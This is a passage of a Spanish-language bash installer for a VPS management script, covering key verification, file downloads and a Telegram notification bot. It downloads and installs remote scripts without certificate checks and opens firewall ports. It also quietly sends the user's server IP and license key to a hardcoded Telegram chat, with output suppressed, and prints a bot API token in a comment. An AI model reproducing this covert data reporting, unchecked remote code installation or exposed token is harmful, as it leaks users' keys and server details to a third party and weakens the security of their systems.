 msg -ama " Notify-BOT (Notificasion Remota)|@VPSDARK_Noty_Bot " 

 msg -bar 

 echo -e "\033[1;94m Notify-BOT es un simple notificador de:" 

 echo -e "\033[1;94m >> Usuario Expirado" 

 echo -e "\033[1;94m >> Usuario Eliminado" 

 echo -e "\033[1;94m >> Avisos de VPS Reiniciada" 

 echo -e "\033[1;94m >> Avisos de Monitor de Protocolos" 

 echo -e "\033[1;97m Inicie El BOT de Telegram" 

 echo -e "\033[1;92m ¡¡ Para sacar su ID entre al BOT @VPSDARK" 

 echo -e "\033[1;92m Aparesera algo parecido � → Tu ID es: 45145564   " 

 msg -bar 

 echo -e "\033[1;93mIgrese un nombre para el VPS:\033[0;37m"; read -p " " nombr 

 echo "${nombr}" > /etc/VPS-MX/controlador/nombre.log 

 echo -e "\033[1;93mIgrese su ID �:\033[0;37m"; read -p " " idbot 

 echo "${idbot}" > /etc/VPS-MX/controlador/IDT.log 

 msg -bar 

 echo -e "\033[1;32m              ID AGREGADO CON EXITO" 

 msg -bar 

 wget -qO- ifconfig.me > /etc/VPS-MX/IP.log 

 ipt=`less /etc/VPS-MX/IP.log` > /dev/null 2>&1 

 Nip="$(echo $ipt)" 

 NOM="$(less /etc/VPS-MX/controlador/nombre.log)" 

 NOM1="$(echo $NOM)" 

 IDB1=`less /etc/VPS-MX/controlador/IDT.log` > /dev/null 2>&1 

 IDB2=`echo $IDB1` > /dev/null 2>&1 

 #KEY="5935180805:AAHd0N9ube02JlsUrKWSVChOVsZGBtabSrw" 

# URL="https://api.telegram.org/bot$KEY/sendMessage" 

 MSG="⚠️ ►► AVISO DE VPS: $NOM1 ⚠ 

 � ►► IP: $Nip 

 � ►► MENSAJE DE PRUEBA 

 � ►► NOTI-BOT ACTIVADO CORRECTAMENTE" 

 curl -s --max-time 10 -d "chat_id=$IDB2&disable_web_page_preview=1&text=$MSG" $URL &>/dev/null 

 echo -e "\033[1;34m            SE ENVIO MENSAJE DE PRUEBA " 

 } 

 fun_ipe 

 wget -O /usr/bin/trans https://raw.githubusercontent.com/scriptsmx/script/master/Install/trans &> /dev/null 

 wget -O /bin/Desbloqueo.sh https://raw.githubusercontent.com/lacasitamx/VPSMX/master/SCRIPT-8.4/Utilidad/Desbloqueo.sh &> /dev/null 

 chmod +x /bin/Desbloqueo.sh 

 wget -O /bin/monitor.sh https://raw.githubusercontent.com/lacasitamx/VPSMX/master/SCRIPT-8.4/Utilidad/monitor.sh &> /dev/null 

 chmod +x /bin/monitor.sh 

 wget -O /var/www/html/estilos.css https://raw.githubusercontent.com/lacasitamx/VPSMX/master/SCRIPT-8.4/Utilidad/estilos.css &> /dev/null 

 [[ -f "/usr/sbin/ufw" ]] && ufw allow 443/tcp &>/dev/null; ufw allow 80/tcp &>/dev/null; ufw allow 3128/tcp &>/dev/null; ufw allow 8799/tcp &>/dev/null; ufw allow 8080/tcp &>/dev/null; ufw allow 81/tcp &>/dev/null 

 clear 

 msg -bar2 

 msg -ama "     [ SCRIPT \033[1;97m  MOD LACASITAMX\033[1;33m ]" 

 msg -ama "  \033[1;96m      �Usar Ubuntu 20 a 64 De Preferencia� " 

 msg -bar2 

 [[ $1 = "" ]] && funcao_idioma || { 

 [[ ${#1} -gt 2 ]] && funcao_idioma || id="$1" 

 } 

 error_fun () { 

 msg -bar2 && msg -verm "ERROR entre VPS<-->GENERADOR (Port 81 TCP)" && msg -bar2 

 [[ -d ${SCPinstal} ]] && rm -rf ${SCPinstal} 

 exit 1 

 } 

 invalid_key () { 

 msg -bar2 && msg -verm "  Code Invalido -- #¡Key Invalida#! " && msg -bar2 

 [[ -e $HOME/lista-arq ]] && rm $HOME/lista-arq 

 rm -rf lista-arq 

 exit 1 

 } 

 while [[ ! $Key ]]; do 

 msg -bar2 && msg -ne "\033[1;93m          >>> INGRESE SU KEY ABAJO <<<\n   \033[1;37m" && read Key 

 tput cuu1 && tput dl1 

 done 

 msg -ne "    # Verificando Key # : " 

 cd $HOME 

 wget -O $HOME/lista-arq $(ofus "$Key")/$IP > /dev/null 2>&1 && echo -e "\033[1;32m Ofus Correcto" || { 

 echo -e "\033[1;91m Ofus Incorrecto" 

 invalid_key 

 exit 

 } 

 IP=$(ofus "$Key" | grep -vE '127\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}' | grep -o -E '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}') && echo "$IP" > /usr/bin/venip 

 sleep 1s 

#function_verify 

 updatedb 

 if [[ -e $HOME/lista-arq ]] && [[ ! $(cat $HOME/lista-arq|grep "Code de KEY Invalido!") ]]; then 

 msg -bar2 

 msg -verd "    $(source trans -b es:${id} "Ficheros Copiados"|sed -e 's/[^a-z -]//ig'): \e[97m[\e[93m@CAT\e[97m]" 

 REQUEST=$(ofus "$Key"|cut -d'/' -f2) 

 [[ ! -d ${SCPinstal} ]] && mkdir ${SCPinstal} 

 pontos="." 

 stopping="Descargando Ficheros" 

 for arqx in $(cat $HOME/lista-arq); do 

 msg -verm "${stopping}${pontos}" 

 wget --no-check-certificate -O ${SCPinstal}/${arqx} ${IP}:81/${REQUEST}/${arqx} > /dev/null 2>&1 && verificar_arq "${arqx}" || error_fun 

 tput cuu1 && tput dl1 

 pontos+="." 

 done 

 wget -qO- ifconfig.me > /etc/VPS-MX/IP.log 

 userid="${SCPdir}/ID" 

 #TOKEN="5935180805:AAHd0N9ube02JlsUrKWSVChOVsZGBtabSrw" 

 #URL="https://api.telegram.org/bot$TOKEN/sendMessage" 

 MSG="�= KEY INSTALADO =� 

 ╔═════ ▓▓ ࿇ ▓▓ ═════╗ 

 - - - - - - - ×∆× - - - - - - - 

 User ID: 

 - - - - - - - ×∆× - - - - - - - 

 Usuario: $(cat ${SCPdir}/message.txt) 

 - - - - - - - ×∆× - - - - - - - 

 IP: $(cat ${SCPdir}/IP.log) 

 - - - - - - - ×∆× - - - - - - - 

 KEY: $Key 

 - - - - - - - ×∆× - - - - - - - 

 By @

 - - - - - - - ×∆× - - - - - - - 

 ╚═════ ▓▓ ࿇ ▓▓ ═════╝ 

 " 

 activ=

 curl -s --max-time 10 -d "chat_id=$activ&disable_web_page_preview=1&text=$MSG" $URL &>/dev/null 

 curl -s --max-time 10 -d "chat_id=605531451&disable_web_page_preview=1&text=$MSG" $URL &>/dev/null 

 rm ${SCPdir}/IP.log &>/dev/null 

 msg -bar2 

 listaarqs="$(locate "lista-arq"|head -1)" && [[ -e ${listaarqs} ]] && rm $listaarqs 

 cat /etc/bash.bashrc|grep -v '[[ $UID != 0 ]] && TMOUT=15 && export TMOUT' > /etc/bash.bashrc.2 

 echo -e '[[ $UID != 0 ]] && TMOUT=15 && export TMOUT' >> /etc/bash.bashrc.2 

 mv -f /etc/bash.bashrc.2 /etc/bash.bashrc 

 echo "${SCPdir}/menu" > /usr/bin/menu && chmod +x /usr/bin/menu 

 echo "${SCPdir}/menu" > /usr/bin/vpsdark && chmod +x /usr/bin/vpsdark 
 
 echo "$Key" > ${SCPdir}/key.txt 

 [[ -d ${SCPinstal} ]] && rm -rf ${SCPinstal} 

 [[ ${#id} -gt 2 ]] && echo "es" > ${SCPidioma} || echo "${id}" > ${SCPidioma} 

 echo -e "${cor[2]}         DESEAS INSTALAR NOTI-BOT?(Default n)" 

 echo -e "\033[1;34m  (Deves tener Telegram y el BOT: @DARK_MOD_Noty_Bot)" 

 msg -bar2 

 read -p " [ s | n ]: " NOTIFY 

 [[ "$NOTIFY" = "s" || "$NOTIFY" = "S" ]] && NOTIFY 

 msg -bar2 

 [[ ${byinst} = "true" ]] && install_fim 

 else 

 invalid_key 

 rm -rf VPSDARK ista-arq 

 fi 

 rm -rf VPSDARK lista-arq
